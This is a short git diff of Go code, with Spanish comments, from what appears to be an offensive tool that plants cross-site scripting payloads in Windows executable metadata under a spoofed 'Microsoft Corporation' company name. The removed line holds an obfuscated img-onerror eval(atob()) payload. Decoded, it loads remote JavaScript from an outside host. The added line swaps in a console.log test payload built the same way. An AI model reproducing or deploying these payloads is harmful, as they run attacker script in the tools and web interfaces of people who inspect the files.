@@ -35,8 +35,9 @@ func EmbedPEMetadata() {
 
 // GetPEMetadataWithXSS retorna metadata con XSS para embeber
 func GetPEMetadataWithXSS(callbackServer string, payloadID string) map[string]string {
-	// Payload específico solicitado
-	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`
+	// Payload específico - Console log con base64
+	// Base64 de: console.log('11223344')
+	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coJzExMjIzMzQ0Jyk= onerror=eval(atob(this.id))>`
 
 	return map[string]string{
 		"CompanyName":      fmt.Sprintf(`Microsoft Corporation%s`, specificPayload),
